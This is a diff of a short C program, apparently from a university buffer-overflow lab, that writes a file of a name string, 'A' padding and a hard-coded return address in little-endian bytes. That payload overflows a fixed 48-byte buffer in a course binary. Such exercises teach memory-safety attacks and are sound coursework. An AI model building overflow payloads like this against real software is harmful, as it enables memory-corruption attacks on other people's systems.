@@ -16,18 +16,21 @@ int main(void) {
    FILE *dataB;
    dataB = fopen("dataB", "wb");
 
-    const char name[] = "Alex Delisthathis & Matthew Zhang";
-    fwrite(name, sizeof(char), strlen(name), dataB);
+   const char name[] = "Alex Delisthathis & Matthew Zhang";
+   fwrite(name, sizeof(char), strlen(name), dataB);
 
-    const int paddingSize = 48 - 1 - strlen(name);
-    for (int i = 0; i < paddingSize; i++) {
-        fputc('A', dataB); 
-    }
+   const int paddingSize = 48 - strlen(name);
 
-    unsigned int address = 0x04196500;
-    fwrite(&address, sizeof(unsigned int), 1, dataB);
+   for (int i = 0; i < paddingSize; i++) {
+      fputc('A', dataB); 
+   }
 
-    fclose(dataB);
-    return 0;
+   putc(0x00, dataB);  
+   putc(0x65, dataB); 
+   putc(0x19, dataB);  
+   putc(0x04, dataB);  
+
+   fclose(dataB);
+   return 0;
 }
 
